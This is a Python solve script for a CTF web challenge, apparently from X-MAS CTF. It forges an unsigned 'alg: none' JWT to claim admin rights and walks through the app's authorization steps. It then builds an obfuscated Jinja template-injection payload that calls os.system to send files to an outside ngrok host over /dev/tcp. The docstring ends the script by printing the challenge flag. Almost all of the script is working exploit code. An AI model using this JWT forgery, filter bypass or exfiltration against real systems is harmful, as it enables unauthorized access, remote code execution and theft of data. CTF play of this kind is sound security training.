#!/usr/bin/env python3

import hashlib
import html

import requests

from base64 import (
    b64encode)

from bs4 import (
    BeautifulSoup)


URL = 'http://challs.xmas.htsp.ro:11005'
USER = 'brian'
PASSWORD = 'password'


def get_admin_token(user=USER):
    return (
        b64encode(b'{"typ": "JWT", "alg": "none"}') +
        b'.' +
        b64encode(b'{"user": "' + user.encode('utf-8') +
                  b'", "type": "admin", "pass": "' +
                  PASSWORD.encode('utf-8') + b'"}') +
        b'.'
    ).decode('utf-8')


def get_uid(user=USER):
    md5sum = hashlib.md5(user.encode('utf-8')).hexdigest()
    uid = 1
    print('MD5:', md5sum)
    for c in md5sum:
        if c in '0123456789':
            uid += int(c)

    return uid


def main():
    s = requests.Session()

    token = get_admin_token()
    uid = get_uid()
    print('TOKEN:', token)
    print('USER:', USER, '-> UID:', uid)

    auth_cookie = requests.cookies.create_cookie('auth', token)
    s.cookies.set_cookie(auth_cookie)

    # register our user
    r = s.post(f'{URL}/register', data={'user': USER, 'pass': PASSWORD})
    assert r.status_code == 200

    # initialize user in adminPrivileges
    r = s.post(f'{URL}/authorize?step=1',
               data=dict(privilegeCode=PASSWORD))
    assert r.status_code == 200

    # upgrade our user to authorized status
    access_code = str(uid) + USER + PASSWORD + PASSWORD
    r = s.post(f'{URL}/authorize?step=2',
               data=dict(accessCode=access_code))
    assert r.status_code == 200

    r = s.get(URL)
    assert 'Level 2' in r.text

    # build template injection payload
    def dunder(text):
        _ = "g.get|string|slice(4)|first|last"
        return f"{_}~{_}~'{text}'~{_}~{_}"

    def spacify(text):
        space = 'g.get|string|slice(9)|list|first|last'
        tokens = text.split(' ')
        return f'~{space}~'.join(f"'{token}'" for token in tokens)

    payload = f'{URL}/makehat?hatName='
    payload += '{{'
    payload += 'session|attr(' + dunder('class') + ')'
    payload += '|attr(' + dunder('init') + ')'
    payload += '|attr(' + dunder('globals') + ')'
    payload += '|attr(' + dunder('getitem') + ')(' + dunder('builtins') + ')'
    payload += '|attr(' + dunder('getitem') + ')'
    payload += '(' + dunder('import') + ")('os')"
    payload += "|attr('system')"
    payload += '('
    payload += spacify(
        "bash -c \\'cat *mp4 > /dev/tcp/0.tcp.ngrok.io/17617\\'"
    )
    payload += ')'
    payload += '}}'

    print('\nPAYLOAD:')
    print(payload)

    r = s.get(payload)
    soup = BeautifulSoup(r.text, 'lxml')
    injection = soup.find_all('span')[0].text
    print('\nRESPONSE:')
    print(html.unescape(injection))

    """
    At this point, we have exfil-ed the mp4 movie. Open it to see the flag:
    X-MAS{W3lc0m3_70_7h3_h4t_f4ct0ry__w3ve_g0t_unusu4l_h4ts_90d81c091da}
    """


if __name__ == '__main__':
    main()
